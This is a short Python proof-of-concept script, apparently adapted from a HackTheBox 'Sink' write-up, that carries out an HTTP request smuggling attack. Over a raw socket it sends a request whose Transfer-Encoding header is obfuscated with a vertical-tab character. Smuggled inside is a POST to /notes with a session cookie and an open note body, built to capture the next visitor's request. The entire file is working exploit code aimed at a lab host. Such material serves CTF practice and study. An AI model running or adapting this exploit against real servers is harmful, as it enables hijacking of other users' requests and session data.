#!/usr/bin/python3
##
############
##
## 0xdf httb sink modified
## https://0xdf.gitlab.io/2021/09/18/htb-sink.html
## https://portswigger.net/web-security/request-smuggling
## https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling
##
###################

import socket

host = "10.10.10.222"
port = 6969

body = f"""0

POST /notes HTTP/1.1
Host: {host}:{port}
Referer: http://10.10.10.225:5000/notes
Content-Type: text/plain
Content-Length: 50 
Cookie: session=eyJlbWFpbCI6IjB4ZGZAc2luay5odGIifQ.YAri4g.PYo0eJg0oYeW_8_k5QKNi2R78QM

note=""".replace('\n','\r\n')

header = f"""GET / HTTP/1.1
Host: {host}:{port}
Content-Length: {len(body)}
Transfer-Encoding: \x0bchunked

""".replace('\n','\r\n')

request = (header + body).encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.send(request)
    
    
##############
##
##
